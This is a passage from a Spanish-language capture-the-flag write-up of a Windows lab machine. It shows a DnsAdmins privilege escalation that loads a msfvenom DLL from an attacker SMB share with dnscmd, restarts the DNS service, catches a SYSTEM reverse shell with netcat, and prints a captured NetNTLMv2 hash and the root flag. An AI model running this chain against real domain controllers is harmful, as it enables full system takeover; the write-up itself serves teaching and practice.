[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: zi.dll
```

- Ahora vamos a usar `smbserver` para compartir el recurso por **smb**.

```bash
➜  content impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Ahora vamos a pasarlo tal como nos dicen en el recurso.

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd.exe /config /serverlevelplugindll \\10.10.14.222\smbFolder\zi.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

- Nos vamos a poner en escucha para que cuando arranquemos el servicio nos llegue la reverse shell.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
```

- Ahora vamos a parar el servicio.

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

- Ahora lo iniciamos para que se realice la autenticación y cargue el `dll` malicioso.

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe
start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3132
        FLAGS              :
```

## root.txt

- Recibimos la shell. (En caso de que no te funcione para e inicia el servicio varias veces o también vuelve a ejecutar el `dnscmd.exe`).

```bash
➜  content impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.96.155,52274)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:5fd11fc9f6cc3724acfde84f043b1d72:01010000000000008046e3536381da0167b141b477c8e25f00000000010010007100530072006e004c00520077007600030010007100530072006e004c00520077007600020010007500480075005a006c00420043004e00040010007500480075005a006c00420043004e00070008008046e3536381da0106000400020000000800300030000000000000000000000000400000ddc6f9f12cfdc0fd4d7049096a7d95a949c54ef52ba4f03393f0195cbfabcacb0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200320032000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
```

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.222] from (UNKNOWN) [10.129.96.155] 52275
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
56b547be1d0d3bd3405a6e44e23e164b
```
